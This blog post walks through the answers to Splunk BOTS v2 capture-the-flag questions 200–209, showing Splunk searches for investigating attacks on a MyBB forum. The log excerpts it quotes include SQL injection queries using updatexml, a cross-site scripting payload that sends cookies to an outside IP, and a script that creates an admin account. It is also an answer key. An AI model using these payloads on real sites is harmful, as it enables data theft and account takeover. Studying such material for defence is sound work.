---
layout: post
current: post
cover:  assets/built/images/bots/v2/bots-v2.jpg
navigation: True
title: splunk-bots-v2 write up(2)
date: '2021-10-04 20:04:36 +0530'
tags: [splunk]
class: post-template
subclass: 'post tag-splunk'
author: wind-flow
---
{% include bots-table-of-contents.html %}

APT Scenarios:

In this hands-on exercise, you assume the persona of Alice Bluebird, the analyst who successfully assisted Wayne Enterprises and was recommended to Grace Hoppy at Frothly to assist them with their recent issues.  
이 실습에서는 Wayne Enterprises를 성공적으로 지원하고 Frothly의 Grace Hoppy에게 최근 문제를 지원하도록 추천된 분석가 Alice Bluebird의 페르소나를 가정합니다.

Hunting Scenarios:

PowerShell: Adversaries will use PowerShell Empire to establish a foothold and carry out attacks.  
PowerShell: 적들은 PowerShell Empire를 사용하여 거점을 구축하고 공격을 수행합니다.  
Exfiltration Over Alternative Protocol - FTP: Data Exfiltration may occur using common network protocols, principally FTP  
Exfiltration Over Alternative Protocol - FTP: 데이터 유출은 주로 FTP와 같은 일반적인 네트워크 프로토콜을 사용하여 발생할 수 있습니다.  
Exfiltration Over Alternative Protocol - DNS: Data Exfiltration may occur using common network protocols, specifically DNS  
Exfiltration Over Alternative Protocol - DNS: 데이터 유출은 일반적인 네트워크 프로토콜, 특히 DNS를 사용하여 발생할 수 있습니다.  
Adversary Infrastructure: The adversary has established multiple components of infrastructure beyond what we have already uncovered.  
Adversary Infrastructure: 적군은 우리가 이미 밝혀낸 것 이상의 기반 시설의 여러 구성 요소를 구축했습니다.  
Spearphishing Attachment: Adversaries will attempt to establish a foothold within Froth.ly using Phishing.  
Spearphishing Attachment: 적들은 피싱을 사용하여 Froth.ly 내에 거점을 구축하려고 시도합니다.  
User Execution: Adversaries will attempt to establish a foothold within Froth.ly by enticing a user to execute an action on a file.  
User Execution: 공격자는 사용자가 파일에 대해 작업을 실행하도록 유인하여 Froth.ly 내에서 거점을 설정하려고 시도합니다.  
Persistence - Create Account: An adversary will look to maintain persistence across an enterprise by creating user accounts.  
Persistence - Create Account: 공격자는 사용자 계정을 생성하여 기업 전체에서 지속성을 유지하려고 합니다.  
Persistence - Scheduled Task: An adversary will look to maintain persistence across reboots by using a task scheduler.  
Persistence - Scheduled Task: 공격자는 작업 스케줄러를 사용하여 재부팅 시 지속성을 유지하려고 합니다.  
Indicator Removal On Host: Clearing of audit / event logs could indicate an adversary attempting to cover their tracks.  
Indicator Removal On Host: 감사/이벤트 로그를 지우면 공격자가 자신의 흔적을 덮으려는 것을 나타낼 수 있습니다.  
Reconaissance: User Agent Strings may provide insight into an adversary that they may not have intended to show.  
Reconaissance: 사용자 에이전트 문자열은 의도하지 않은 적에 대한 통찰력을 제공할 수 있습니다.
OSINT: Identifying publicly available company information and who is accessing it may provide insight into the adversary.  
OSINT: 공개적으로 사용 가능한 회사 정보와 해당 정보에 액세스하는 사람을 식별하면 적에 대한 통찰력을 제공할 수 있습니다.  
Lateral Movement: Adversaries will look to move laterally to other systems using Windows Management Instrumentation (WMI).  
Lateral Movement: 공격자는 WMI(Windows Management Instrumentation)를 사용하여 측면으로 다른 시스템으로 이동합니다.  
Data Staging: Adversaries will stage data prior to exfiltration to make it easier to extract data at a time of their choosing as well as have a central place to place information as it is identified.  
Data Staging: 공격자는 데이터 유출 전에 데이터를 준비하여 원하는 시간에 데이터를 쉽게 추출할 수 있을 뿐만 아니라 식별된 정보를 배치할 중앙 위치를 확보합니다.  


![Scenario 1]({{site.url}}/assets/built/images/bots/v2/b21.jpg)

The data included in this app was generated in August of 2017 by members of Splunk's Security Specialist team - Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve and James Brodsky. They stood up a few lab environments connected to the Internet. Within the environment they had a few Windows endpoints instrumented with the Splunk Universal Forwarder and Splunk Stream. The forwarders were configured with best practices for Windows endpoint monitoring, including a full Microsoft Sysmon deployment and best practices for Windows Event logging. The environment included a Palo Alto Networks next-generation firewall to capture traffic and provide web proxy services, and Suricata to provide network-based IDS. This resulted in the dataset below.  
이 앱에 포함된 데이터는 2017년 8월 Splunk의 보안 전문가 팀(Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve 및 James Brodsky)이 생성한 것입니다. 그들은 인터넷에 연결된 몇 개의 실험 환경을 구축했습니다. 환경 내에는 Splunk Universal Forwarder 및 Splunk Stream으로 계측된 몇 개의 Windows 엔드포인트가 있었습니다. Forwarder는 전체 Microsoft Sysmon 배포 및 Windows 이벤트 로깅을 위한 모범 사례를 포함하여 Windows endpoint 모니터링을 위한 모범 사례로 구성되었습니다. 이 데이터셋은 트래픽을 캡처하고 웹 프록시 서비스를 제공하는 Palo Alto Networks 차세대 방화벽과 네트워크 기반 IDS를 제공하는 Suricata가 포함되었습니다. 그 결과 아래 데이터세트가 생성되었습니다.

![Scenario 2]({{site.url}}/assets/built/images/bots/v2/b22.jpg)

200	What is the public IPv4 address of the server running www.brewertalk.com?  
www.brewertalk.com의 공개 IPv4 주소는 무엇입니까?

<details>
  <summary>hint#1</summary>
  Do you have access to a network diagram? If you do, use it!
  네트워크 다이어그램에 액세스할 수 있습니까? 있으면, 사용하세요!
</details>

<details>
  <summary>hint#2</summary>
  A Splunk Stream forwarder running in the Frothly on-prem environment would observe http traffic destined for www.brewertalk.com as having an internet routable IP address.<br>
  Frothly 온프레미스 환경에서 실행되는 Splunk Stream forwarder는 www.brewertalk.com으로 향하는 http 트래픽이 인터넷 라우팅 가능한 IP 주소를 갖는 것으로 관찰합니다.
</details>

stream:http에서 해당 URL로 검색한 후, dest_ip필드에서 찾을 가능성이 높습니다.
```
sourcetype=stream:http www.brewertalk.com
| dedup site dest_ip
| table site dest_ip
```


site|	dest_ip|
|---|---|
|www.brewertalk.com|172.31.4.249|
|www.brewertalk.com|52.42.208.228|
|ec2-52-40-10-231.us-west-2.compute.amazonaws.com:8088|172.31.10.10|
|ec2-52-40-10-231.us-west-2.compute.amazonaws.com:8088|52.40.10.231|
|45.77.65.211:9999|45.77.65.211|
|brewertalk.com|172.31.4.249|

www.brewertalk.com의 dest_ip의 값을 보면 172.31.4.249와 52.42.208.228이 있습니다.
문제에서 공개IP를 물어봤으니 사설IP대역은 172.31.4.249이 아닌, 52.42.208.228이 공개 IP입니다.

답 : 52.42.208.228

201	Provide the IP address of the system used to run a web vulnerability scan against www.brewertalk.com.  
www.brewertalk.com에 대해 웹 취약점 스캔을 실행하는 데 사용되는 시스템의 IP 주소를 제공하십시오.

<details>
  <summary>hint#1</summary>
  App scanners are often 'noisy' and therefore easy to detect with automated correlation searches.<br>
  앱 스캐너는 '잡음'일 경우가 많기 때문에 자동화된 상관 관계 검색으로 쉽게 감지할 수 있습니다.
</details>

<details>
  <summary>hint#2</summary>
  Drill down into contributing events if you can!<br>
  가능하면 기여 이벤트를 자세히 살펴보십시오!
</details>

scan이면 request 횟수가 많을것입니다.

www.berkbeer.com의 ip(52.42.208.228, 172.31.4.249)를 dest_ip로 설정하고 count해봅시다.
그리고, header에 

쿼리결과를 토대로 검증해봅니다.(스캔치고 이벤트 수가 적습니다.)

```
sourcetype=stream:http dest_ip=52.42.208.228 OR dest_ip=172.31.4.249
| stats count by src_ip dest_ip
| sort -count
```

|src_ip	dest_ip	count
|45.77.65.211|172.31.4.249|9708|
|52.40.10.231|172.31.4.249|634|
|172.31.10.10|52.42.208.228|303|
|71.39.18.125|172.31.4.249|160|
|174.209.13.154|172.31.4.249|134|
|10.0.2.109|52.42.208.228|84|
|136.0.2.138|172.31.4.249|24|
|136.0.0.125|172.31.4.249|8|

답 : 45.77.65.211

202	The IP address from question 201 is also being used by a likely different piece of software to attack a URI path. What is the URI path? Answer guidance: Include the leading forward slash in your answer. Do not include the query string or other parts of the URI. Answer example: /phpinfo.php  
201번 문제의 IP 주소는 URI 경로를 공격하기 위해 다른 소프트웨어에서도 사용되고 있습니다. URI 경로는 무엇입니까? 답변 안내: 답변에 선행 슬래시를 포함하십시오. 쿼리 문자열이나 URI의 다른 부분을 포함하지 마십시오. 답변 예시: /phpinfo.php
<details>
  <summary>hint#1</summary>
    Analyze all HTTP traffic from the scanning system to www.brewertalk.com, and inspect the different HTTP user agents. A different HTTP user agent often indicates a different HTTP client program was in use.<br>
    스캐닝 시스템에서 www.brewertalk.com으로의 모든 HTTP 트래픽을 분석하고 다양한 HTTP 사용자 에이전트를 검사합니다. 다른 HTTP 사용자 에이전트는 종종 다른 HTTP 클라이언트 프로그램이 사용 중임을 나타냅니다.
</details>

<details>
  <summary>hint#2</summary>
    For each HTTP user agent, inspect the URI that the user agent is interacting with.<br>
    각 HTTP 사용자 에이전트에 대해 사용자 에이전트가 상호 작용하는 URI를 검사합니다.
</details>

```
sourcetype=stream:http src_ip=45.77.65.211
```

field중 uri_path 필드가 있으니, 어떤 uri가 있는지 봅시다.

![uri_path]({{site.url}}/assets/built/images/bots/v2/2021-10-24-02-53-51.png)

"/member.php"가 가장 많습니다. 어떤 특이사항이 있는지 봅시다.

```
sourcetype=stream:http src_ip=45.77.65.211 uri_path="/member.php"
```

dest_content 필드의 내용을 보면 중간 SQL Injection의 흔적이 보입니다.

```
SELECT q.*, s.sid
			FROM mybb_questionsessions s
			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SUBSTRING((SELECT password FROM mybb_users ORDER BY UID LIMIT 5,1), 32, 31))),NULL) and '1'
```

/member.php uri에 SQL Injection 공격을 하고있는 것을 알 수 있습니다.

답 : /member.php

203	What SQL function is being abused on the uri path from question 202?  
문제 202의 uri 경로에서 어떤 SQL 함수를 통해 침입시도를 하고 있습니까?

<details>
  <summary>hint#1</summary>
    SQL stands for Structured Query Language and it is used to interact with relational databases like mysql. Some common terms in SQL include 'SELECT' 'WHERE' 'FROM' and 'JOIN'.<br>
    SQL은 Structured Query Language의 약자로 mysql과 같은 관계형 데이터베이스와 상호 작용하는 데 사용됩니다. SQL의 일반적인 용어로는 'SELECT' 'WHERE' 'FROM' 및 'JOIN'이 있습니다.
</details>

<details>
  <summary>hint#2</summary>
    SQL injection vulnerabilities can arise when a programmer does not properly check user input for characters that might have an impact on how the underlying database query is assembled in his or her code. A single quote character provided as input to a web page ' is often a tell-tale sign of a SQL injection attack.<br>
    SQL injection 취약점은 프로그래머가 기본 데이터베이스 쿼리가 코드에서 어셈블되는 방식에 영향을 미칠 수 있는 문자에 대한 사용자 입력을 적절하게 확인하지 않을 때 발생할 수 있습니다. 웹 페이지에 대한 입력으로 제공되는 작은 따옴표 '는 종종 SQL 주입 공격을 알리는 신호입니다.
</details>

<details>
  <summary>hint#3</summary>
    XML is one of many data formats that can be stored in relational databases like mysql. Some SQL commands in the MySQL database can be used to produce an error that leaks database contents. Look for a SQL command that updates XML.<br>
    XML은 mysql과 같은 관계형 데이터베이스에 저장할 수 있는 많은 데이터 형식 중 하나입니다. MySQL 데이터베이스의 일부 SQL 명령을 사용하여 데이터베이스 내용을 누출하는 오류를 생성할 수 있습니다. XML을 업데이트하는 SQL 명령을 찾으십시오.
</details>

문제 202에서 파악한 SQL에서 포함된 함수는 updatexml입니다.

답 : updatexml

204	What is Frank Ester's password salt value on www.brewertalk.com?  
www.brewertalk.com에서 Frank Ester의 비밀번호의 salt 값은 얼마입니까?

<details>
  <summary>hint#1</summary>
    Narrow down the events to only those that include the suspected SQL injection traffic. Stream HTTP events contain the details you need. Filter on the source IP, dest, IP, HTTP user agent and URI path.<br>
    의심되는 SQL injection 트래픽을 포함하는 이벤트로만 이벤트 범위를 좁힙니다. 스트림 HTTP 이벤트에는 필요한 세부 정보가 포함되어 있습니다. 소스 IP, 대상, IP, HTTP 사용자 에이전트 및 URI 경로를 필터링합니다.
</details>

<details>
  <summary>hint#2</summary>
    These events will probably make a lot more sense if you reverse the Splunk event ordering by piping your search results to the reverse command. This will show you the first SQL injection commands at the top of the list and later events below.<br>
    검색 결과를 reverse 명령으로 파이프하여 Splunk 이벤트 순서를 반대로 하면 이러한 이벤트가 훨씬 더 의미가 있을 것입니다. 이렇게 하면 목록 상단에 첫 번째 SQL injection 명령이 표시되고 아래에 이후 이벤트가 표시됩니다.
</details>

<details>
  <summary>hint#3</summary>
    There is a lot of data captured in these events. You are looking for two pieces of data in the dest_content field. The first can be found following the string 'XPATH syntax error: '<br>
    이러한 이벤트에는 많은 데이터가 캡처되어 있습니다. dest_content 필드에서 두 개의 데이터를 찾고 있습니다. 첫 번째는 'XPATH 구문 오류: ' 문자열 다음에서 찾을 수 있습니다.
</details>

<details>
  <summary>hint#4</summary>
    The other important piece of data in the dest_content field can be extracted with the following regular expression: '<dt>Query:</dt>\s+<dd>\s+(?<sqli_query>[^<]+)' Look for the sqli_query values that are stealing salt values.<br>
    dest_content 필드의 다른 중요한 데이터는 다음 정규식으로 추출할 수 있습니다. '<dt>Query:</dt>\s+<dd>\s+(?<sqli_query>[^<]+)' 솔트 값을 훔치는 sqli_query 값.
</details>

문제 202번에서 사용했던 쿼리에 frank ester관련 키워드를 추가해봅시다.

```
sourcetype=stream:http src_ip=45.77.65.211 uri_path=/member.php *frank* OR *ester*
```

dest_content필드의 중간 내용을 보면 username과 email을 알기위해 SQL injection 공격시도흔적이 보입니다.

```
1. 결과
<dt>SQL Error:</dt>
<dd>1105 - XPATH syntax error: ':frankesters47@gmail.com'</dd>
<dt>Query:</dt>
<dd>
			SELECT q.*, s.sid
			FROM mybb_questionsessions s
			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SELECT email FROM mybb_users ORDER BY UID LIMIT 0,1)),NULL) and '1'
		</dd>
2. 결과
<dt>SQL Error:</dt>
<dd>1105 - XPATH syntax error: ':frank'</dd>
<dt>Query:</dt>
<dd>
			SELECT q.*, s.sid
			FROM mybb_questionsessions s
			LEFT JOIN mybb_questions q ON (q.qid=s.qid)
			WHERE q.active='1' AND s.sid='makman' and updatexml(NULL,concat (0x3a,(SELECT username FROM mybb_users ORDER BY UID LIMIT 0,1)),NULL) and '1'
		</dd>

```

첫번째는 eamil, 두번째는 username 조회시도를 하고있습니다. 해당 이벤트 시간을 기준으로 ±5초로 발생한 SQL문의 이벤트를 봅시다.

![](2021-10-24-12-09-35.png)

```
sourcetype=stream:http src_ip=45.77.65.211 uri_path=/member.php
| rex field=dest_content "<dt>Query:</dt>\s+<dd>\s+(?<sqli_query>[^<]+)"
| rex field=dest_content "<dd>1105 - XPATH syntax error:\s+(?<sql_errcode>[^<]+)"
| search sqli_query=*
| table _time sql_errcode sqli_query
| sort _time
```

sql_errcode 필드를 보면 아래차례대로 sql injection시도를 하고 있습니다.
테이블명(mybb_users) -> row수(6) -> uid(1) -> username의 길이(5) -> 유저이름(frank) -> email주소길이(23) -> email(frankesters47@gmail.com) -> salt길이(8) -> salt(gGsxysZL) -> 비밀번호 길이(32) 

답 : gGsxysZL

205	What is user btun's password on brewertalk.com?  
berwertalk.com에서 btun의 비밀번호는 무엇입니까 ?

<details>
  <summary>hint#1</summary>
    His hashed password and salt was stolen via SQLi and captured in Splunk. Also note a 'top 1000' password list is available in a Splunk lookup table file called 'top_1000.csv'. Use '| inputlookup top_1000.csv' to inspect it.<br>
    그의 해시된 암호와 slat값은 SQL injection을 통해 도난당했으며 Splunk에서 발견되었습니다. 또한 'top_1000.csv'라는 Splunk 조회 테이블 파일에서 '상위 1000' 암호 목록을 사용할 수 있습니다. 사용 '| inputlookup top_1000.csv'를 검사하여 검사합니다.
</details>

<details>
  <summary>hint#2</summary>
    By inspecting the code for this forum software, it can be determined that the stored password hash is computed as follows: md5( md5(salt) + md5(plaintext password) ) where '+' is simple string concatenation.<br>
    이 포럼 소프트웨어의 코드를 검사하여 저장된 암호 해시가 다음과 같이 계산되었음을 확인할 수 있습니다. md5(md5(salt) + md5(일반 텍스트 암호)) 여기서 '+'는 단순히 문자열 연결을 뜻합니다.
</details>

<details>
  <summary>hint#3</summary>
    The Splunk eval command includes an md5 hash function. Beware that the exploit used in this attack chops the final character from the password hash and includes it as a single character string in the next SQLi extraction. When you use this string, either add the character back to the end of the hash, or just use a wildcard match on the beginning of it.<br>
    Splunk eval 명령에는 md5 해시 함수가 포함되어 있습니다. 이 공격에 사용된 익스플로잇은 비밀번호 해시에서 최종 문자를 잘라내고 다음 SQLi 추출에서 단일 문자열로 포함한다는 점에 유의하십시오. 이 문자열을 사용할 때 해시 끝에 문자를 다시 추가하거나 시작 부분에 와일드카드 일치를 사용하십시오.
</details>

<details>
  <summary>hint#4</summary>

</details>

해당 질문은 현 실습 환경에서 제공되지 않는 Splunk ES에서 확인할 수 있는것으로 문제풀이는 하지않겠습니다.

206	What are the characters displayed by the XSS probe? Answer guidance: Submit answer in native language or character set.
XSS 프로브가 표시하는 문자는 무엇입니까? 답변 안내: 현지어 또는 문자 집합으로 답변을 제출합니다.

<details>
  <summary>hint#1</summary>
    The attack is obscured in the logs by URL encoding.
    공격은 URL 인코딩에 의해 로그에서 가려집니다.
</details>

<details>
  <summary>hint#2</summary>
    Splunk has the capability to URLdecode strings. Check your quick reference guide or Google for it.
    Splunk에는 문자열을 URL 디코딩하는 기능이 있습니다. 빠른 참조 가이드 또는 Google을 확인하십시오.
</details>

<details>
  <summary>hint#3</summary>
    Try using | eval decoded_uri=urldecode(uri)
    다음 SPL을 사용해보세요 | eval decoded_uri=urldecode(uri)
</details>
<details>
  <summary>hint#4</summary>
    Don't forget to check if others on your team have investigated this before.
    팀의 다른 사람들이 전에 이것을 조사했는지 확인해보세요.
</details>

XSS공격은 script를 이용한 공격입니다. 키워드 script가 있는 form_data를 조사해봅시다. 

```
sourcetype=stream:http "<script>"
| dedup form_data
| table _time form_data src_ip
```


|_time|form_data|src_ip|
|---|---|---|
|2017/08/16 15:19:17.163	|module=user-titles&action=edit&utid=2%22%3E%3Cscript%3E%0Awindow.onload%3Dfunction(e)%7B%0A%20%20var%20my_post_key%20%3D%20document.getElementsByName(%22my_post_key%22)%5B0%5D.value%0A%20%20console.log(my_post_key)%3B%0A%20%20var%20postdata%3D%20%22my_post_key%3D%22%2Bmy_post_key%2B%22%26username%3DkIagerfield%26password%3Dbeer_lulz%26confirm_password%3Dbeer_lulz%26email%3DkIagerfield%40froth.ly%26usergroup%3D4%26additionalgroups%5B%5D%3D4%26displaygroup%3D4%22%3B%2F%2FPost%20the%20Data%0A%20%20var%20url%20%3D%20%22http%3A%2F%2Fwww.brewertalk.com%2Fadmin%2Findex.php%3Fmodule%3Duser-users%26action%3Dadd%22%3B%0A%20%20var%20http%3B%0A%20%20http%20%3D%20new%20XMLHttpRequest()%3B%0A%20%20http.open(%22Post%22%2Curl)%3B%0A%0A%20%20http.setRequestHeader(%27Accept%27%2C%27text%2Fhtml%27)%3B%0A%20%20http.setRequestHeader(%27Content-type%27%2C%27application%2Fx-www-form-urlencoded%27)%3B%0A%20%20http.setRequestHeader(%27Accept%27%2C%27application%2Fxhtml%2Bxml%27)%3B%0A%20%20http.setRequestHeader(%27Accept%27%2C%27application%2Fxml%27)%3B%0A%20%20http.send(postdata)%3B%0A%20%20console.log(my_post_key)%3B%0A%7D%0A%3C%2Fscript%3E|71.39.18.125|
|2017/08/15 23:36:34.915|action=activate&uid=-1&code=%22%3E%3Cscript%3Edocument.location%3D%22http%3A%2F%2F45.77.65.211%3A9999%2Fmicrosoftuserfeedbackservice%3Fmetric%3D%22%20%2B%20document.cookie%3B%3C%2Fscript%3E|71.39.18.125|
|2017/08/12 09:49:00.520|action=activate&uid=-1&code=%22%3E%3Cscript%3Ealert(%27%EB%8C%80%EB%8F%99%27)%3C%2Fscript%3E|136.0.0.125|

내용이 base64인코딩되어 있습니다. urldecode함수를 통해 디코딩해봅시다.

```
sourcetype=stream:http "<script>"
| dedup form_data
| eval decoded=urldecode(form_data) 
| table _time decoded src_ip
```

|_time|decoded|src_ip|
|---|---|---|
|2017/08/16 15:19:17.163|module=user-titles&action=edit&utid=2"><script>
window.onload=function(e){
  var my_post_key = document.getElementsByName("my_post_key")[0].value
  console.log(my_post_key);
  var postdata= "my_post_key="+my_post_key+"&username=kIagerfield&password=beer_lulz&confirm_password=beer_lulz&email=kIagerfield@froth.ly&usergroup=4&additionalgroups[]=4&displaygroup=4";//Post the Data
  var url = "http://www.brewertalk.com/admin/index.php?module=user-users&action=add";
  var http;
  http = new XMLHttpRequest();
  http.open("Post",url);

  http.setRequestHeader('Accept','text/html');
  http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
  http.setRequestHeader('Accept','application/xhtml+xml');
  http.setRequestHeader('Accept','application/xml');
  http.send(postdata);
  console.log(my_post_key);
}

```
</script>|71.39.18.125|
|2017/08/15 23:36:34.915|action=activate&uid=-1&code="><script>document.location="http://45.77.65.211:9999/microsoftuserfeedbackservice?metric=" + document.cookie;</script>|71.39.18.125|
|2017/08/12 09:49:00.520|action=activate&uid=-1&code="><script>('대동')</script>|136.0.0.125|
```

쿼리 결과 중 '대동'이라는 글자를 발견할 수 있습니다.

답 : 대동

207	What was the value of the cookie that Kevin's browser transmitted to the malicious URL as part of a XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign.  
XSS 공격의 일환으로 Kevin의 브라우저가 악성 URL에 전송한 쿠키의 가치는 무엇이었습니까? 답변 안내: 모두 숫자입니다. 쿠키 이름이나 등호와 같은 기호가 아닙니다.

<details>
  <summary>hint#1</summary>
    Check out sourcetype=stream:http
    sourcetype stream:http를 확인해보세요.
</details>

<details>
  <summary>hint#2</summary>
    Inspect the uri_query field.
    uri_query 필드를 검사합니다.
</details>

kevin의 브라우저에서 XSS공격으로 인한 쿠키값이 탈취되었습니다. 키워드 kevin, "<\script>", cookie를 넣어 검색해 봅시다.

```
sourcetype=stream:http *kevin* "<script>" *cookie*
```

1개의 검색결과가 나왔습니다.

내용 중 class="username">kevin</a></span>라는 항목이 있는것을 보니 kevin과 관련된 이벤트입니다.

또, cookie 필드값은 다음과 같습니다.

```
mybb[lastvisit]=1502408189; mybb[lastactive]=1502408191; sid=4a06e3f4a6eb6ba1501c4eb7f9b25228; adminsid=9267f9cec584473a8d151c25ddb691f1; acploginattempts=0
```

여러개의 값 중 lastvisit이 마지막 방문시 쓰였던 쿠키값임을 알 수 있습니다.

답 : 1502408189

208	The brewertalk.com web site employed Cross Site Request Forgery (CSRF) techniques. What was the value of the anti-CSRF token that was stolen from Kevin Lagerfield's computer and used to help create an unauthorized admin user on brewertalk.com?  
brewertalk.com 웹 사이트는 CSRF(Cross Site Request Forgery) 기술을 사용했습니다. Kevin Lagerfield의 컴퓨터에서 도난당하여 brewertalk.com에서 승인되지 않은 관리자를 생성하는 데 사용된 anti-CSRF 토큰 값은 무엇입니까?

<details>
  <summary>hint#1</summary>
    Anti-CSRF tokens are usually hidden form elements set when the browser loads an HTML page containing a form. If the form is submitted without the anti-CSRF token, the backend code of the website rejects the transaction as it might have come from a malicious source rather than from a legitimate user of the form.<br>
    Anti-CSRF 토큰은 일반적으로 브라우저가 양식을 포함하는 HTML 페이지를 로드할 때 설정된 숨겨진 양식 요소입니다. 안티 CSRF 토큰 없이 양식을 제출하는 경우 웹사이트의 백엔드 코드는 해당 양식의 합법적인 사용자가 아닌 악의적인 소스에서 온 것일 수 있으므로 트랜잭션을 거부합니다.
</details>
<details>
  <summary>hint#2</summary>
    One of the many ways that an attacker can abuse a cross site scripting vulnerability is to use it to defeat CSRF protections. If you carefully inspect XSS attacks in the data set, you will stumble on some malicious code that is stealing the anti-CSRF token.<br>
    공격자가 크로스 사이트 스크립팅 취약점을 악용할 수 있는 여러 방법 중 하나는 이를 사용하여 CSRF 보호를 무력화하는 것입니다. 데이터 셋에서 XSS 공격을 주의 깊게 검사하면 anti-CSRF token을 훔치는 일부 악성 코드를 발견하게 될 것입니다.
</details>

<details>
  <summary>hint#3</summary>
    On brewertalk.com, users created with usergroup=4 are administrators.<br>
    brewertalk.com에서 usergroup=4로 생성된 사용자는 관리자입니다.
</details>

CSRF 토큰이란, CSRF공격 대응하기 위해 클라이언트에서 서버로 요청할때 실제 서버에서 허용한 요청이 맞는지 확인하기 위한 값을 말합니다.

[csrf 토큰이란?](https://codevang.tistory.com/282)

```
sourcetype="stream:http" 
| reverse 
| search "input type="hidden""
```

아래 결과를 발견할 수 있습니다.
input type="hidden" name="my_post_key" value="1bc3eab741900ab25c98eee86bf20feb

```
sourcetype="stream:http" 1bc3eab741900ab25c98eee86bf20feb 
| reverse
| table form_data
```
아래와 같이 조회 됩니다.

my_post_key=1bc3eab741900ab25c98eee86bf20feb&username=kIagerfield&password=beer_lulz&confirm_password=beer_lulz&email=kIagerfield@froth.ly&usergroup=4&additionalgroups[]=4&displaygroup=4

답 : 1bc3eab741900ab25c98eee86bf20feb

209	What brewertalk.com username was maliciously created by a spearphishing attack?  
스피어피싱 공격에 의해 악의적으로 생성된 brewertalk.com 사용자 이름은 무엇입니까?

<details>
  <summary>hint#1</summary>
    The attacker was trying to masquerade as something that would look legitimate to a casual observer.<br>
    공격자는 평범한 관찰자에게 합법적으로 보이는 것으로 가장하려고 했습니다.
</details>

<details>
  <summary>hint#2</summary>
    The attacker stole a trick from domain squatters by using a homograph attack. More info on homograph attacks can be found on Wikipedia.<br>
    공격자는 동형이의어(homograph) 공격을 사용하여 도메인 점거자로부터 속임수를 훔쳤습니다. 동형 이의어 공격에 대한 자세한 내용은 Wikipedia에서 찾을 수 있습니다.
</details>

<details>
  <summary>hint#3</summary>
    The password of this new, unauthorized, malicious administrative account is beer_lulz.<br>
    새로운 승인되지 않은 악의적인 관리 계정의 암호는 beer_lulz입니다.
</details>

스피어 피싱(spear phishing)이란, 특정한 개인이나 회사들을 대상으로 시도하는 피싱을 스피어 피싱입니다.

힌트#3을 보면 계정의 암호는 "beer_lulz"입니다. 해당 암호를 키워드로 검색해봅니다.

```
sourcetype="stream:http" beer_lulz
```

form_data필드 값이 아래와 같습니다.
form_data: username=kIagerfield&password=beer_lulz&do=login

유저이름은 kIagerfield입니다.
힌트#2에서 [동형이의어 공격](https://ko.wikiqube.net/wiki/IDN_homograph_attack)을 사용했다고 알려주었으므로, 원래 이름은 두번째글자에서 대문자 I가 아닌, 소문자 l일 가능성이 높습니다.

답 : kIagerfield